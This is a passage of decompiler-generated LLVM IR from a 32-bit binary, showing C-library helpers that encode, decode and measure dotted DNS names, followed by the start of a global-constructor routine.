  %v0_8057022 = phi i32 [ %arg1, %entry ], [ %v6_805701e, %dec_label_pc_8057019 ]
  ret i32 %v0_8057022

; uselistorder directives
  uselistorder i32 65536, { 0, 2, 3, 1, 4, 80, 5, 6, 7, 8, 9, 11, 10, 13, 12, 15, 14, 17, 16, 18, 19, 81, 84, 20, 21, 83, 26, 22, 27, 23, 28, 24, 29, 25, 33, 30, 34, 31, 35, 32, 36, 37, 39, 38, 41, 40, 42, 46, 43, 47, 44, 48, 45, 49, 51, 50, 54, 52, 55, 53, 56, 57, 60, 58, 61, 59, 62, 63, 65, 64, 66, 67, 70, 71, 72, 68, 73, 69, 75, 74, 76, 78, 77, 79, 82 }
  uselistorder i32 128, { 19, 12, 14, 2, 3, 7, 13, 8, 9, 15, 4, 10, 11, 16, 0, 17, 18, 5, 1, 20, 6 }
  uselistorder label %dec_label_pc_8057022, { 1, 0 }
}

define i32 @__encode_dotted(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %v0_8057029 = load i32, i32* @edi, align 4
  %v0_805702a = load i32, i32* @esi, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  %v4_8057031 = ptrtoint i8* %arg1 to i32
  store i32 %v4_8057031, i32* @edi, align 4
  %v1_80570904 = icmp eq i8* %arg1, null
  br i1 %v1_80570904, label %dec_label_pc_8057099, label %dec_label_pc_8057094.lr.ph

dec_label_pc_8057094.lr.ph:                       ; preds = %entry
  br label %dec_label_pc_8057094

dec_label_pc_8057037:                             ; preds = %dec_label_pc_8057094
  %v5_805703c = call i32 @__GI_strchr(i8* %v1_8057094, i32 46)
  %v1_8057046 = icmp eq i32 %v5_805703c, 0
  br i1 %v1_8057046, label %dec_label_pc_8057050, label %dec_label_pc_805704a

dec_label_pc_805704a:                             ; preds = %dec_label_pc_8057037
  %v1_805704c = load i32, i32* @edi, align 4
  %v2_805704c = sub i32 %v5_805703c, %v1_805704c
  br label %dec_label_pc_805705e

dec_label_pc_8057050:                             ; preds = %dec_label_pc_8057037
  %v0_8057053 = load i32, i32* @edi, align 4
  %v5_8057053 = inttoptr i32 %v0_8057053 to i8*
  %v3_8057054 = call i32 @strlen(i8* %v5_8057053)
  br label %dec_label_pc_805705e

dec_label_pc_805705e:                             ; preds = %dec_label_pc_805704a, %dec_label_pc_8057050
  %v0_8057071 = phi i32 [ %v2_805704c, %dec_label_pc_805704a ], [ %v3_8057054, %dec_label_pc_8057050 ]
  store i32 %v0_8057071, i32* @esi, align 4
  %v1_805705e = icmp eq i32 %v0_8057071, 0
  %v3_805705e = trunc i32 %v0_8057071 to i8
  br i1 %v1_805705e, label %dec_label_pc_80570ad, label %dec_label_pc_8057062

dec_label_pc_8057062:                             ; preds = %dec_label_pc_805705e
  %v1_8057066 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8057066 = sub i32 %arg3, %v1_8057066
  %v1_8057068 = add i32 %v2_8057066, -1
  %v7_8057069 = icmp ult i32 %v0_8057071, %v1_8057068
  %v1_805706b = icmp eq i1 %v7_8057069, false
  br i1 %v1_805706b, label %dec_label_pc_80570ad, label %dec_label_pc_805706d

dec_label_pc_805706d:                             ; preds = %dec_label_pc_8057062
  store i32 %arg2, i32* @edx, align 4
  %v4_8057073 = add i32 %v1_8057066, %arg2
  %v5_8057073 = inttoptr i32 %v4_8057073 to i8*
  store i8 %v3_805705e, i8* %v5_8057073, align 1
  %v0_8057076 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8057076 = add i32 %v0_8057076, 1
  %v0_8057078 = load i32, i32* @edx, align 4
  %v2_805707a = add i32 %v1_8057076, %v0_8057078
  %v0_805707c = load i32, i32* @esi, align 4
  %v0_805707d = load i32, i32* @edi, align 4
  %v2_805707f = add i32 %v0_805707c, %v1_8057076
  store i32 %v2_805707f, i32* %ebx.global-to-local, align 4
  %tmp29 = inttoptr i32 %v2_805707a to i16*
  %v7_8057081 = call i32 @memcpy(i16* %tmp29, i32 %v0_805707d, i32 %v0_805707c)
  %v1_805708d = add i32 %v5_805703c, 1
  br i1 %v1_8057046, label %dec_label_pc_8057099, label %dec_label_pc_8057090

dec_label_pc_8057090:                             ; preds = %dec_label_pc_805706d
  store i32 %v1_805708d, i32* @edi, align 4
  %v1_8057090 = icmp eq i32 %v1_805708d, 0
  br i1 %v1_8057090, label %dec_label_pc_8057099, label %dec_label_pc_8057094

dec_label_pc_8057094:                             ; preds = %dec_label_pc_8057094.lr.ph, %dec_label_pc_8057090
  %v0_805703b = phi i32 [ %v4_8057031, %dec_label_pc_8057094.lr.ph ], [ %v1_805708d, %dec_label_pc_8057090 ]
  %v1_8057094 = inttoptr i32 %v0_805703b to i8*
  %v2_8057094 = load i8, i8* %v1_8057094, align 1
  %v3_8057094 = icmp eq i8 %v2_8057094, 0
  %v1_8057097 = icmp eq i1 %v3_8057094, false
  br i1 %v1_8057097, label %dec_label_pc_8057037, label %dec_label_pc_8057099

dec_label_pc_8057099:                             ; preds = %dec_label_pc_8057090, %dec_label_pc_8057094, %dec_label_pc_805706d, %entry
  %tmp30 = icmp slt i32 %arg3, 1
  br i1 %tmp30, label %dec_label_pc_80570ad, label %dec_label_pc_80570a0

dec_label_pc_80570a0:                             ; preds = %dec_label_pc_8057099
  %v1_80570a4 = load i32, i32* %ebx.global-to-local, align 4
  %v2_80570a4 = add i32 %v1_80570a4, %arg2
  %v3_80570a4 = inttoptr i32 %v2_80570a4 to i8*
  store i8 0, i8* %v3_80570a4, align 1
  %v0_80570a8 = load i32, i32* %ebx.global-to-local, align 4
  %v1_80570a8 = add i32 %v0_80570a8, 1
  br label %dec_label_pc_80570b0

dec_label_pc_80570ad:                             ; preds = %dec_label_pc_8057062, %dec_label_pc_805705e, %dec_label_pc_8057099
  br label %dec_label_pc_80570b0

dec_label_pc_80570b0:                             ; preds = %dec_label_pc_80570a0, %dec_label_pc_80570ad
  %storemerge2 = phi i32 [ %v1_80570a8, %dec_label_pc_80570a0 ], [ -1, %dec_label_pc_80570ad ]
  store i32 %v0_805702a, i32* @esi, align 4
  store i32 %v0_8057029, i32* @edi, align 4
  ret i32 %storemerge2

; uselistorder directives
  uselistorder i8* %v1_8057094, { 1, 0 }
  uselistorder i32 %v1_805708d, { 0, 2, 1 }
  uselistorder i32 %v0_805707c, { 1, 0 }
  uselistorder i1 %v1_8057046, { 1, 0 }
  uselistorder i32 %v5_805703c, { 2, 0, 1 }
  uselistorder i32* %ebx.global-to-local, { 1, 2, 0, 3, 4, 5 }
  uselistorder i32 (i8*)* @strlen, { 2, 7, 6, 1, 0, 5, 4, 3, 8 }
  uselistorder i32 (i8*, i32)* @__GI_strchr, { 7, 8, 9, 0, 1, 2, 3, 4, 5, 6, 10, 11 }
  uselistorder i32 46, { 2, 5, 0, 6, 1, 3, 4 }
  uselistorder i8* null, { 3, 5, 2, 7, 0, 1, 6, 8, 9, 10, 11, 13, 12, 14, 15, 16, 17, 18, 4 }
  uselistorder label %dec_label_pc_80570b0, { 1, 0 }
  uselistorder label %dec_label_pc_80570ad, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8057099, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_8057094, { 1, 0 }
  uselistorder label %dec_label_pc_805705e, { 1, 0 }
}

define i32 @__decode_dotted(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %ebp.global-to-local = alloca i32, align 4
  %v0_80570ba = load i32, i32* @esi, align 4
  store i32 %arg2, i32* @edx, align 4
  %v4_80570c3 = icmp eq i32 %arg1, 0
  br i1 %v4_80570c3, label %dec_label_pc_8057184, label %dec_label_pc_80570ce

dec_label_pc_80570ce:                             ; preds = %entry
  store i32 0, i32* %ebp.global-to-local, align 4
  store i32 0, i32* @ecx, align 4
  %v2_805716c2740 = add i32 %arg2, %arg1
  %v3_805716c2841 = inttoptr i32 %v2_805716c2740 to i8*
  %v4_805716c2942 = load i8, i8* %v3_805716c2841, align 1
  %v1_80571703144 = icmp eq i8 %v4_805716c2942, 0
  %v1_80571723245 = icmp eq i1 %v1_80571703144, false
  br i1 %v1_80571723245, label %dec_label_pc_80570dc.lr.ph, label %dec_label_pc_8057178

dec_label_pc_80570dc:                             ; preds = %dec_label_pc_80570dc.lr.ph, %dec_label_pc_80570f5
  %v0_80570e6 = phi i32 [ %v0_80570e6.pre, %dec_label_pc_80570dc.lr.ph ], [ %v4_8057100, %dec_label_pc_80570f5 ]
  %v8_80570dc38 = phi i1 [ %v8_80570dc3350, %dec_label_pc_80570dc.lr.ph ], [ true, %dec_label_pc_80570f5 ]
  %v5_805716c37.in = phi i8 [ %v5_805716c3049.in, %dec_label_pc_80570dc.lr.ph ], [ %v4_805716c, %dec_label_pc_80570f5 ]
  %stack_var_-17.136 = phi i8 [ %stack_var_-17.1.ph48, %dec_label_pc_80570dc.lr.ph ], [ 0, %dec_label_pc_80570f5 ]
  %v0_80570e335 = phi i32 [ %v0_80570e3.ph46, %dec_label_pc_80570dc.lr.ph ], [ %v2_805710f, %dec_label_pc_80570f5 ]
  %v5_805716c37 = zext i8 %v5_805716c37.in to i32
  %v1_80570e3 = add i32 %v0_80570e335, 1
  store i32 %v1_80570e3, i32* @esi, align 4
  %v3_80570e6 = select i1 %v8_80570dc38, i32 2, i32 1
  %v4_80570e6 = add i32 %v3_80570e6, %v0_80570e6
  store i32 %v4_80570e6, i32* %ebp.global-to-local, align 4
  %v1_80570e9 = and i32 %v5_805716c37, 192
  %v6_80570ee = icmp eq i32 %v1_80570e9, 192
  %v1_80570f3 = icmp eq i1 %v6_80570ee, false
  br i1 %v1_80570f3, label %dec_label_pc_8057118, label %dec_label_pc_80570f5

dec_label_pc_80570f5:                             ; preds = %dec_label_pc_80570dc
  %v4_8057100 = add i32 %v3_80570e6, %v4_80570e6
  store i32 %v4_8057100, i32* %ebp.global-to-local, align 4
  %tmp = urem i8 %v5_805716c37.in, 64
  %v1_8057103 = zext i8 %tmp to i32
  %v2_8057106 = add i32 %v1_80570e3, %arg1
  %v3_8057106 = inttoptr i32 %v2_8057106 to i8*
  %v4_8057106 = load i8, i8* %v3_8057106, align 1
  %v5_8057106 = zext i8 %v4_8057106 to i32
  %v2_805710a = mul nuw nsw i32 %v1_8057103, 256
  %v2_805710f = or i32 %v5_8057106, %v2_805710a
  store i32 %v2_805710f, i32* @edx, align 4
  store i32 %v1_8057135.ph47, i32* @ecx, align 4
  %v2_805716c = add i32 %v2_805710f, %arg1
  %v3_805716c = inttoptr i32 %v2_805716c to i8*
  %v4_805716c = load i8, i8* %v3_805716c, align 1
  %v1_8057170 = icmp eq i8 %v4_805716c, 0
  %v1_8057172 = icmp eq i1 %v1_8057170, false
  br i1 %v1_8057172, label %dec_label_pc_80570dc, label %dec_label_pc_8057178

dec_label_pc_8057118:                             ; preds = %dec_label_pc_80570dc
  %v2_8057118 = add i32 %v5_805716c37, %v1_8057135.ph47
  %v1_8057121 = add i32 %v2_8057118, 1
  store i32 %v1_8057121, i32* @edi, align 4
  %v10_8057122 = icmp ult i32 %v1_8057121, %arg4
  %v1_8057126 = icmp eq i1 %v10_8057122, false
  br i1 %v1_8057126, label %dec_label_pc_8057184, label %dec_label_pc_8057128

dec_label_pc_8057128:                             ; preds = %dec_label_pc_8057118
  %v2_805712e = add i32 %v1_80570e3, %arg1
  %v2_8057135 = add i32 %v1_8057135.ph47, %arg3
  %v3_8057138 = inttoptr i32 %v2_8057135 to i16*
  %v4_8057138 = call i32 @memcpy(i16* %v3_8057138, i32 %v2_805712e, i32 %v5_805716c37)
  %v0_8057140 = load i32, i32* @esi, align 4
  %v2_8057140 = add i32 %v0_8057140, %v5_805716c37
  store i32 %v2_8057140, i32* @edx, align 4
  br i1 %v8_80570dc38, label %dec_label_pc_805714c, label %dec_label_pc_805714a

dec_label_pc_805714a:                             ; preds = %dec_label_pc_8057128
  %v0_805714a = load i32, i32* %ebp.global-to-local, align 4
  %v2_805714a = add i32 %v0_805714a, %v5_805716c37
  store i32 %v2_805714a, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_805714c

dec_label_pc_805714c:                             ; preds = %dec_label_pc_8057128, %dec_label_pc_805714a
  %v4_8057163 = add i32 %v2_8057118, %arg3
  %v5_8057163 = inttoptr i32 %v4_8057163 to i8*
  store i8 46, i8* %v5_8057163, align 1
  %v0_8057166.pre = load i32, i32* @edi, align 4
  %v1_805716c.pre.pre = load i32, i32* @edx, align 4
  store i32 %v0_8057166.pre, i32* @ecx, align 4
  %v2_805716c27 = add i32 %v1_805716c.pre.pre, %arg1
  %v3_805716c28 = inttoptr i32 %v2_805716c27 to i8*
  %v4_805716c29 = load i8, i8* %v3_805716c28, align 1
  %v1_805717031 = icmp eq i8 %v4_805716c29, 0
  %v1_805717232 = icmp eq i1 %v1_805717031, false
  %v8_80570dc33 = icmp eq i8 %stack_var_-17.136, 0
  %v0_80570e6.pre.pre = load i32, i32* %ebp.global-to-local, align 4
  br i1 %v1_805717232, label %dec_label_pc_80570dc.lr.ph, label %dec_label_pc_8057178

dec_label_pc_80570dc.lr.ph:                       ; preds = %dec_label_pc_805714c, %dec_label_pc_80570ce
  %v0_80570e6.pre = phi i32 [ 0, %dec_label_pc_80570ce ], [ %v0_80570e6.pre.pre, %dec_label_pc_805714c ]
  %v8_80570dc3350 = phi i1 [ false, %dec_label_pc_80570ce ], [ %v8_80570dc33, %dec_label_pc_805714c ]
  %v5_805716c3049.in = phi i8 [ %v4_805716c2942, %dec_label_pc_80570ce ], [ %v4_805716c29, %dec_label_pc_805714c ]
  %stack_var_-17.1.ph48 = phi i8 [ 1, %dec_label_pc_80570ce ], [ %stack_var_-17.136, %dec_label_pc_805714c ]
  %v1_8057135.ph47 = phi i32 [ 0, %dec_label_pc_80570ce ], [ %v0_8057166.pre, %dec_label_pc_805714c ]
  %v0_80570e3.ph46 = phi i32 [ %arg2, %dec_label_pc_80570ce ], [ %v1_805716c.pre.pre, %dec_label_pc_805714c ]
  br label %dec_label_pc_80570dc

dec_label_pc_8057178:                             ; preds = %dec_label_pc_805714c, %dec_label_pc_80570f5, %dec_label_pc_80570ce
  %v0_805717d = phi i32 [ 0, %dec_label_pc_80570ce ], [ %v4_8057100, %dec_label_pc_80570f5 ], [ %v0_80570e6.pre.pre, %dec_label_pc_805714c ]
  %v8_80570dc.lcssa = phi i1 [ false, %dec_label_pc_80570ce ], [ true, %dec_label_pc_80570f5 ], [ %v8_80570dc33, %dec_label_pc_805714c ]
  %v2_805717f = zext i1 %v8_80570dc.lcssa to i32
  %v3_805717f = add i32 %v0_805717d, 1
  %v4_805717f = add i32 %v3_805717f, %v2_805717f
  br label %dec_label_pc_8057187

dec_label_pc_8057184:                             ; preds = %dec_label_pc_8057118, %entry
  br label %dec_label_pc_8057187

dec_label_pc_8057187:                             ; preds = %dec_label_pc_8057178, %dec_label_pc_8057184
  %storemerge = phi i32 [ %v4_805717f, %dec_label_pc_8057178 ], [ -1, %dec_label_pc_8057184 ]
  store i32 %v0_80570ba, i32* @esi, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v1_8057135.ph47, { 2, 1, 0 }
  uselistorder i8 %v4_805716c, { 1, 0 }
  uselistorder i32 %v2_805710f, { 0, 2, 1 }
  uselistorder i32 %v4_8057100, { 0, 2, 1 }
  uselistorder i32 %v5_805716c37, { 4, 3, 1, 2, 0 }
  uselistorder i32* %ebp.global-to-local, { 2, 0, 3, 1, 4, 5 }
  uselistorder i8 1, { 1, 10, 13, 2, 12, 8, 5, 6, 0, 3, 4, 9, 11, 7 }
  uselistorder i8 46, { 3, 4, 0, 1, 5, 2 }
  uselistorder i32 (i16*, i32, i32)* @memcpy, { 8, 9, 10, 11, 12, 13, 14, 16, 2, 3, 17, 18, 20, 0, 1, 15, 4, 5, 6, 19, 7 }
  uselistorder i32* @edi, { 3, 185, 186, 23, 187, 188, 189, 22, 190, 191, 4, 192, 0, 193, 194, 195, 196, 197, 198, 199, 200, 201, 202, 203, 204, 205, 206, 207, 31, 6, 5, 32, 33, 34, 35, 36, 44, 37, 38, 39, 40, 41, 42, 43, 208, 7, 209, 8, 210, 211, 212, 213, 218, 219, 1, 214, 215, 216, 217, 220, 221, 222, 223, 106, 9, 107, 108, 109, 224, 225, 232, 233, 234, 254, 255, 256, 257, 258, 259, 260, 261, 262, 263, 264, 166, 167, 168, 169, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 10, 121, 122, 123, 124, 125, 126, 127, 336, 337, 11, 338, 339, 12, 342, 343, 293, 294, 295, 52, 53, 54, 344, 345, 360, 163, 13, 164, 165, 45, 46, 47, 48, 49, 50, 51, 178, 14, 179, 180, 303, 304, 305, 306, 307, 308, 309, 310, 311, 312, 313, 314, 315, 316, 317, 55, 56, 57, 58, 59, 60, 61, 318, 319, 320, 321, 322, 323, 324, 325, 15, 326, 327, 328, 329, 330, 265, 266, 16, 267, 268, 269, 270, 271, 272, 273, 281, 282, 283, 284, 285, 128, 129, 17, 130, 358, 359, 131, 132, 133, 18, 243, 244, 235, 236, 237, 238, 239, 240, 241, 242, 62, 63, 64, 245, 246, 247, 134, 135, 136, 137, 138, 139, 140, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 19, 155, 28, 29, 30, 141, 20, 142, 143, 354, 355, 356, 357, 248, 249, 250, 251, 252, 253, 156, 157, 158, 159, 226, 227, 228, 229, 230, 231, 340, 341, 181, 182, 291, 292, 65, 66, 67, 296, 297, 351, 352, 353, 68, 21, 69, 70, 71, 72, 298, 299, 73, 74, 75, 346, 347, 348, 349, 350, 76, 77, 78, 81, 79, 80, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 2, 98, 99, 100, 101, 102, 103, 104, 105, 160, 161, 162, 170, 171, 172, 173, 174, 175, 176, 177, 24, 25, 26, 27, 183, 184, 274, 275, 276, 277, 278, 279, 280, 286, 287, 288, 289, 290, 300, 301, 302, 331, 332, 333, 334, 335 }
  uselistorder i32 256, { 1, 2, 3, 4, 5, 48, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 47, 16, 17, 18, 21, 19, 20, 22, 23, 24, 43, 44, 25, 45, 49, 26, 27, 54, 28, 29, 0, 52, 53, 46, 30, 31, 32, 33, 34, 55, 35, 36, 37, 38, 39, 40, 50, 56, 41, 51, 42 }
  uselistorder i8 64, { 0, 1, 5, 6, 2, 7, 3, 4 }
  uselistorder i1 true, { 1, 4, 11, 3, 5, 6, 8, 7, 9, 10, 2, 0 }
  uselistorder i32* @edx, { 8, 174, 175, 176, 177, 178, 179, 180, 22, 3, 184, 182, 183, 2, 185, 186, 187, 188, 189, 190, 191, 192, 50, 54, 51, 52, 53, 193, 194, 195, 196, 197, 198, 199, 205, 200, 201, 202, 203, 204, 4, 23, 163, 107, 108, 109, 110, 111, 112, 113, 206, 207, 218, 208, 5, 222, 223, 224, 225, 445, 9, 6, 24, 164, 114, 115, 209, 210, 10, 211, 212, 213, 116, 117, 118, 119, 120, 121, 529, 530, 531, 532, 11, 533, 534, 448, 452, 172, 453, 57, 536, 55, 537, 454, 540, 541, 548, 547, 538, 156, 86, 12, 87, 88, 89, 90, 91, 92, 93, 157, 158, 159, 160, 161, 56, 457, 458, 13, 459, 460, 461, 462, 463, 464, 465, 466, 467, 468, 469, 470, 471, 14, 472, 473, 455, 456, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 15, 74, 75, 76, 474, 475, 476, 477, 478, 479, 480, 481, 482, 483, 484, 485, 486, 487, 488, 489, 490, 491, 492, 493, 494, 495, 496, 497, 498, 499, 500, 501, 502, 503, 504, 505, 506, 507, 508, 509, 510, 16, 511, 512, 513, 514, 515, 516, 517, 543, 162, 226, 227, 229, 1, 181, 228, 444, 122, 214, 215, 216, 77, 217, 123, 124, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 21, 142, 143, 125, 144, 17, 145, 146, 148, 18, 149, 150, 151, 152, 153, 49, 19, 147, 539, 219, 220, 221, 20, 154, 446, 447, 535, 173, 542, 443, 544, 528, 0, 449, 450, 78, 440, 451, 79, 545, 546, 80, 81, 82, 83, 84, 85, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 155, 165, 166, 167, 168, 169, 170, 171, 25, 26, 27, 29, 30, 28, 31, 32, 33, 34, 35, 37, 36, 38, 39, 40, 42, 41, 43, 44, 45, 46, 47, 48, 230, 231, 232, 233, 234, 235, 236, 237, 238, 239, 240, 241, 242, 243, 244, 245, 246, 247, 248, 249, 250, 251, 252, 253, 254, 255, 256, 257, 258, 259, 260, 261, 262, 263, 264, 265, 266, 267, 268, 269, 270, 271, 272, 273, 274, 275, 276, 277, 278, 279, 280, 281, 282, 283, 284, 285, 286, 287, 288, 289, 290, 291, 292, 293, 294, 295, 296, 297, 298, 299, 300, 301, 302, 303, 304, 305, 306, 307, 308, 309, 310, 311, 312, 313, 314, 315, 316, 317, 318, 319, 320, 321, 322, 323, 324, 325, 326, 327, 328, 329, 330, 331, 332, 333, 334, 335, 336, 337, 338, 339, 340, 341, 342, 343, 344, 345, 346, 347, 348, 349, 350, 351, 352, 353, 354, 355, 356, 357, 358, 359, 360, 361, 362, 363, 364, 365, 366, 367, 368, 369, 370, 371, 372, 373, 374, 375, 376, 377, 378, 379, 380, 381, 382, 383, 384, 385, 386, 387, 388, 389, 390, 391, 392, 393, 394, 395, 396, 397, 398, 399, 400, 401, 402, 403, 404, 405, 406, 407, 408, 409, 410, 411, 412, 413, 414, 415, 416, 417, 418, 419, 420, 421, 422, 423, 424, 425, 426, 427, 428, 429, 430, 431, 432, 433, 434, 435, 436, 437, 438, 439, 441, 442, 518, 519, 520, 521, 523, 527, 522, 525, 526, 7, 524, 549 }
  uselistorder i32* @esi, {}
  uselistorder i32 %arg1, { 1, 3, 2, 4, 0, 5 }
  uselistorder label %dec_label_pc_8057187, { 1, 0 }
  uselistorder label %dec_label_pc_805714c, { 1, 0 }
}

define i32 @__length_dotted(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_805719e = icmp eq i32 %arg1, 0
  br i1 %v1_805719e, label %dec_label_pc_80571cd, label %dec_label_pc_80571be.preheader

dec_label_pc_80571be.preheader:                   ; preds = %entry
  store i32 %arg2, i32* @ecx, align 4
  %v2_80571be10 = add i32 %arg2, %arg1
  %v3_80571be11 = inttoptr i32 %v2_80571be10 to i8*
  %v4_80571be12 = load i8, i8* %v3_80571be11, align 1
  %v1_80571c214 = add i32 %arg2, 1
  %v1_80571c515 = icmp eq i8 %v4_80571be12, 0
  %v1_80571c716 = icmp eq i1 %v1_80571c515, false
  br i1 %v1_80571c716, label %dec_label_pc_80571ad, label %dec_label_pc_80571c9

dec_label_pc_80571a4:                             ; preds = %dec_label_pc_80571ad
  %v1_80571a4 = add i32 %v0_80571a417, 2
  br label %dec_label_pc_80571c9

dec_label_pc_80571ad:                             ; preds = %dec_label_pc_80571be.preheader, %dec_label_pc_80571be
  %v1_80571c219 = phi i32 [ %v1_80571c2, %dec_label_pc_80571be ], [ %v1_80571c214, %dec_label_pc_80571be.preheader ]
  %v5_80571be18.in = phi i8 [ %v4_80571be, %dec_label_pc_80571be ], [ %v4_80571be12, %dec_label_pc_80571be.preheader ]
  %v0_80571a417 = phi i32 [ %v2_80571bb, %dec_label_pc_80571be ], [ %arg2, %dec_label_pc_80571be.preheader ]
  %v5_80571be18 = zext i8 %v5_80571be18.in to i32
  %v1_80571af = and i32 %v5_80571be18, 192
  %v6_80571b4 = icmp eq i32 %v1_80571af, 192
  %v2_80571bb = add i32 %v5_80571be18, %v1_80571c219
  br i1 %v6_80571b4, label %dec_label_pc_80571a4, label %dec_label_pc_80571be

dec_label_pc_80571be:                             ; preds = %dec_label_pc_80571ad
  store i32 %v2_80571bb, i32* @ecx, align 4
  %v2_80571be = add i32 %v2_80571bb, %arg1
  %v3_80571be = inttoptr i32 %v2_80571be to i8*
  %v4_80571be = load i8, i8* %v3_80571be, align 1
  %v1_80571c2 = add i32 %v2_80571bb, 1
  %v1_80571c5 = icmp eq i8 %v4_80571be, 0
  %v1_80571c7 = icmp eq i1 %v1_80571c5, false
  br i1 %v1_80571c7, label %dec_label_pc_80571ad, label %dec_label_pc_80571c9

dec_label_pc_80571c9:                             ; preds = %dec_label_pc_80571be.preheader, %dec_label_pc_80571be, %dec_label_pc_80571a4
  %v0_80571c9 = phi i32 [ %v1_80571a4, %dec_label_pc_80571a4 ], [ %v1_80571c214, %dec_label_pc_80571be.preheader ], [ %v1_80571c2, %dec_label_pc_80571be ]
  %v2_80571cb = sub i32 %v0_80571c9, %arg2
  br label %dec_label_pc_80571cd

dec_label_pc_80571cd:                             ; preds = %entry, %dec_label_pc_80571c9
  %v0_80571d0 = phi i32 [ -1, %entry ], [ %v2_80571cb, %dec_label_pc_80571c9 ]
  ret i32 %v0_80571d0

; uselistorder directives
  uselistorder i8 %v4_80571be, { 1, 0 }
  uselistorder i32 %v2_80571bb, { 2, 3, 1, 0 }
  uselistorder i32 192, { 0, 3, 1, 4, 2 }
  uselistorder i32 2, { 146, 45, 147, 44, 89, 151, 152, 49, 54, 53, 148, 153, 154, 155, 124, 156, 157, 158, 159, 160, 161, 130, 55, 131, 132, 62, 162, 163, 56, 90, 63, 136, 64, 57, 137, 85, 164, 165, 166, 168, 125, 181, 182, 4, 73, 69, 138, 139, 86, 5, 74, 75, 189, 70, 123, 3, 91, 120, 92, 121, 93, 122, 65, 6, 135, 50, 94, 95, 0, 96, 1, 97, 2, 98, 99, 7, 8, 9, 10, 133, 11, 12, 13, 76, 184, 14, 15, 87, 16, 169, 170, 171, 172, 58, 77, 177, 178, 149, 150, 179, 180, 66, 67, 68, 17, 190, 78, 59, 60, 140, 141, 72, 18, 19, 142, 51, 20, 143, 21, 79, 144, 145, 167, 183, 188, 88, 22, 134, 23, 100, 103, 101, 102, 104, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 80, 37, 38, 39, 40, 46, 41, 47, 42, 105, 106, 81, 107, 108, 109, 71, 110, 111, 112, 126, 127, 128, 129, 113, 114, 115, 116, 173, 48, 174, 61, 175, 82, 52, 176, 117, 118, 83, 187, 84, 185, 43, 186, 119 }
  uselistorder i8 0, { 40, 5, 8, 9, 41, 7, 6, 135, 136, 11, 143, 138, 139, 10, 141, 142, 140, 36, 144, 2, 3, 60, 61, 145, 146, 38, 147, 12, 14, 124, 123, 13, 42, 148, 149, 150, 80, 81, 17, 158, 154, 155, 153, 15, 156, 157, 16, 37, 159, 160, 170, 171, 172, 173, 174, 192, 193, 19, 126, 125, 18, 127, 128, 164, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 4, 184, 98, 99, 215, 100, 216, 219, 76, 43, 55, 77, 20, 218, 198, 199, 200, 62, 201, 202, 203, 204, 205, 206, 44, 207, 22, 182, 183, 21, 137, 101, 102, 56, 1, 32, 33, 34, 31, 0, 45, 46, 47, 103, 175, 187, 188, 122, 165, 166, 161, 163, 162, 104, 105, 106, 107, 108, 109, 110, 23, 111, 112, 24, 113, 114, 115, 116, 117, 118, 119, 120, 58, 217, 167, 168, 169, 121, 151, 152, 63, 64, 25, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 78, 79, 129, 130, 131, 132, 133, 134, 57, 39, 176, 177, 178, 179, 180, 181, 185, 186, 189, 190, 191, 26, 194, 195, 35, 196, 27, 197, 208, 213, 212, 28, 209, 210, 30, 211, 29, 214, 59, 48, 49, 50, 51, 52, 53, 54 }
  uselistorder i32* @ecx, { 27, 6, 8, 26, 7, 121, 124, 15, 125, 126, 127, 128, 16, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 37, 42, 38, 39, 40, 41, 145, 9, 10, 111, 0, 112, 146, 50, 12, 19, 147, 148, 17, 11, 18, 149, 154, 155, 156, 157, 158, 170, 171, 172, 173, 13, 113, 1, 114, 51, 52, 31, 53, 151, 152, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 28, 79, 80, 81, 82, 83, 84, 29, 85, 25, 227, 45, 46, 47, 48, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 195, 196, 197, 198, 20, 199, 174, 175, 176, 200, 201, 202, 203, 204, 205, 206, 207, 208, 209, 210, 211, 212, 213, 21, 214, 215, 217, 218, 219, 216, 223, 159, 122, 123, 32, 33, 150, 86, 87, 88, 89, 90, 91, 92, 30, 93, 14, 94, 95, 96, 97, 98, 22, 23, 2, 3, 99, 100, 24, 101, 102, 103, 104, 105, 107, 108, 109, 110, 35, 36, 106, 221, 153, 222, 224, 225, 226, 34, 43, 44, 49, 115, 116, 117, 118, 119, 120, 160, 161, 162, 163, 164, 5, 165, 166, 167, 4, 168, 169, 220, 228 }
  uselistorder i32 %arg2, { 4, 0, 1, 2, 3 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_80571cd, { 1, 0 }
  uselistorder label %dec_label_pc_80571c9, { 1, 2, 0 }
  uselistorder label %dec_label_pc_80571ad, { 1, 0 }
}

define i32 @__do_global_ctors_aux() local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  store i32 %tmp6, i32* %stack_var_-16, align 4
  %v0_80571ec = load i32, i32* @global_var_805b000.530, align 4096
